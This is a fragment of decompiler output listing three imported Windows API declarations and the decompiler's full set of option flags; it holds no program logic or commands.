/* 0x131420d4       0 */ /* unknown */ void 	CreateToolhelp32Snapshot;
/* 0x131420da       0 */ /* unknown */ void 	URLDownloadToFileA;
/* 0x13142d98       0 */ /* unknown */ void 	RtlUnwind;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
